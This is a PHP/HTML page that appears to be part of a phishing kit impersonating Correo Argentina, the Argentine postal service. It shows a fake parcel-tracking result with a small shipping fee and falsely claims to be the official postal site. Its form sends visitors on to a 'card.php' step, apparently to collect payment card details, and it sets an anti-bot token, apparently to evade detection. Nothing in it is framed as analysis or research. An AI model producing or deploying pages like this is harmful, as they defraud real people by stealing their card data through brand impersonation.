<?php
require "main.php";
setcookie('token',$antibotplot,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);

?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Correo Argentina</title>
</head>
<body>
    <header>
        <div class="logo">
            <img src="res/img/logo.png" alt="">
        </div>
        <div class="links">
            <span>Integraciones</span>
            <span>Iniciar sesión</span>
            <span>Registrarme</span>
        </div>
    </header>
    <main>
        <div class="container">
            <div class="col">
            <div class="text">
            Ingrese el número de paquete para realizar el seguimiento
            </div>
            </div>
            <div class="coll">
            <input type="text" value="AR90645350" readonly>
            <button type="submit">Buscar</button>
            </div>
            </div>
        <form action="card.php" method="post">
        <div class="title">
            <div class="word">
                  RESULTADOS DEL SEGUIMIENTO DE PAQUETES
            </div>
            <div class="track">
            <label class="first"><strong>Número de seguimiento</strong> AR0645350</label>
            <span class="sec"><strong>Código de referencia</strong> 886302903</span>
            <span class="three"><strong>Gastos de envío</strong> <div class="p">ARS 6.21</div></span>
            </div>
			<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($antibotplot); ?>; }</script>

            <div class="btn">
            <button type="submit">Siguiente</button>
            </div>
            </div>
            </form>
    </main>
    <footer>
        <div class="down">
        <img src="res/img/logo.png" alt="">
        <p>Correo Oficial de la República Argentina - Todos los derechos reservados</p>
        </div>
    </footer>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>  
</body>
</html>